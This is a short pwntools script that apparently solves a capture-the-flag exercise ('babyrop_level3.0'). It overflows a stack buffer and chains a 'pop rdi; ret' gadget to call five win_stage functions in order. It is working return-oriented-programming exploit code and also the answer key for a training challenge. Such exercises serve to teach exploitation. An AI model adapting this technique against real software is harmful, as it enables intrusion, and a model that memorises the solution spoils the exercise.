from pwn import *

binary = "/challenge/babyrop_level3.0"
e = context.binary = ELF(binary)

chain = b'A'*120

chain += p64(0x00402ca3) # pop rdi ; ret
chain += p64(1) # arg 1
chain += p64(e.sym['win_stage_1']) # win stage 1

chain += p64(0x00402ca3) # pop rdi ; ret
chain += p64(2) # arg 2
chain += p64(e.sym['win_stage_2']) # win stage 2

chain += p64(0x00402ca3) # pop rdi ; ret
chain += p64(3) # arg 3
chain += p64(e.sym['win_stage_3']) # win stage 3

chain += p64(0x00402ca3) # pop rdi ; ret
chain += p64(4) # arg 4
chain += p64(e.sym['win_stage_4']) # win stage 4

chain += p64(0x00402ca3) # pop rdi ; ret
chain += p64(5) # arg 5
chain += p64(e.sym['win_stage_5']) # win stage 5

p = process("./babyrop_level3.0")
p.recvuntil("address).")
p.sendline(chain)
p.interactive()
